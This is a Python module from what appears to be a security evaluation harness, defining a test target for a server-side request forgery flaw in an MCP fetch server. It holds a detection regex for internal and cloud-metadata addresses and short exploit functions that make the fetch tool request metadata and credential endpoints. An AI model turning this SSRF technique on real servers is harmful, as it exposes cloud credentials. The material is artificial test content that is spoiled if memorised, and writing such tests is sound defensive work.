"""CVE-2026-104120: mcp-server-fetch server-side request forgery (CWE-918).

The `fetch` tool (`fetch_url` in mcp_server_fetch/server.py) requests any caller-supplied URL
with no destination check (the page fetch and the robots.txt pre-check alike), and follows
redirects without revalidation. The vulnerable range leaves loopback, link-local
(169.254.0.0/16, cloud metadata), 0.0.0.0 and the RFC1918 ranges reachable, so one tools/call
makes the server fetch an internal address and return its body: reach = internal_fetch. The
patched release (2026.10.10) resolves each destination through an httpx request hook and refuses
any non-globally-routable address by default.
"""

import re
from collections.abc import Awaitable, Callable

from evals.cve_environments import ssrf_env
from evals.cve_grammar import MechanismClass
from evals.cve_places import Places
from evals.cve_planting import PlantingHost, SymbolicUser
from evals.cve_targets import CVETarget
from mcp_auditor.domain.ports import MCPClientPort

# An exploit is "aimed" when its URL targets an internal / link-local / metadata destination.
# A benign public fetch (example.com) matches none of these.
AIM = re.compile(
    r"169\.254\.|127\.0\.0\.1|localhost|metadata\.google|0\.0\.0\.0"
    r"|\b10\.\d|192\.168\.|172\.(1[6-9]|2[0-9]|3[01])\.",
    re.IGNORECASE,
)

KEPT_PLACES: tuple[str, ...] = ("imds", "ecs-task-credentials", "eks-pod-identity")


def _exploit(place_id: str) -> Callable[[Places, MCPClientPort], Awaitable[None]]:
    async def run(places: Places, client: MCPClientPort) -> None:
        place = places[place_id]
        url = f"http://{place.coordinates.host}{place.coordinates.path}"
        await client.call_tool("fetch", {"url": url, "raw": True})

    return run


async def _benign(places: Places, client: MCPClientPort) -> None:
    # A public, globally-routable fetch: allowed on both versions, not aimed, surfaces no nonce.
    await client.call_tool("fetch", {"url": "https://example.com/", "raw": True})


TARGET = CVETarget(
    cve_id="CVE-2026-104120",
    severity="CVSS 7.5 (v3.1, NVD)",
    mechanism=MechanismClass.INTERNAL_FETCH,
    aim=AIM,
    reaches=frozenset({"internal_fetch"}),
    kept_places=KEPT_PLACES,
    images=("holdout-2026-104120-fetch", "sentinel"),
    server_image="holdout-2026-104120-fetch",
    patched_image="holdout-2026-104120-fetch-patched",
    planting_host=PlantingHost(
        user=SymbolicUser.UNPRIVILEGED, working_directory="/srv/app", has_network=True
    ),
    builder=ssrf_env,
    exploits=tuple(_exploit(place_id) for place_id in KEPT_PLACES),
    benign=_benign,
    awaited_capability=None,
    note=(
        "SSRF (CWE-918): the fetch tool requests any caller-supplied URL with no destination "
        "check, so a link-local / cloud-metadata address is fetched and its body returned."
    ),
    tools_filter=None,
)
